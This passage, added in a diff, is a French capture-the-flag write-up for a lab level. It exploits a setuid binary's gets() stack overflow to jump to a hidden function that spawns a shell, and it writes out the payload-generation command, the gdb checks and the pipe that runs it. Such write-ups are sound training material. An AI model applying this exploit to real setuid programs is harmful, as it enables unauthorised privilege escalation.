@@ -1,0 +1,25 @@
+On a un executable qui se lance avec les droits de notre user cible:
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+
+En copiant cet executable sur ma machine hote, je peux le passer au logiciel ghidra afin de l'analyser.
+
+En examinant l'arbre des symbole, je remarque que:
+> la fonction main appelle la fonction gets sur un buffer declare sur la stack "char local_50 [76];"
+> une fonction "run" est presente dans l'executable, celle-ci lance un shell "system("/bin/sh");"
+
+En lisant la documentation de la fonction gets, on s'appercoit d'une faille:
+N'utilisez jamais gets(). Comme il est impossible de savoir à l'avance combien de caractères seront lus par gets(), et comme celui-ci écrira tous les caractères lus, même s'ils débordent du tampon, cette fonction est extrèmement dangereuse à utiliser. On a déjà utilisé ce dysfonctionnement pour créer des trous de sécurité.
+L'objectif ici est de faire overflow le buffer au dela des 76 caracteres afin de placer l'adresse de la fonction "run" qui lancera un shell.
+
+Pour ce faire, il faut proceder par etapes:
+> trouver l'adresse de la fonction "run" au lancement du programme a l'aide de gdb "p run" 0x8048444, \x44\x84\x04\x08 en format little-endian
+> creer un payload afin d'exploiter la faille, celui-ci contiendra 76 caracteres puis l'adresse de la fonction run:
+python -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/exploit
+> verifier si le payload fonctionne avec gdb:
+disas main
+b *main+22
+run < /tmp/exploit
+x/4x $esp
+> si l'adresse de "run" se trouve bien tout en haut de la stack avant le retour du programme, nous devrions pouvoir lancer cette commande pour faire spawn un shell:
+cat /tmp/exploit - | ./level1
+(L'argument "-" passe a cat permet de garder l'entree standart ouverte afin de garder le shell interactif)
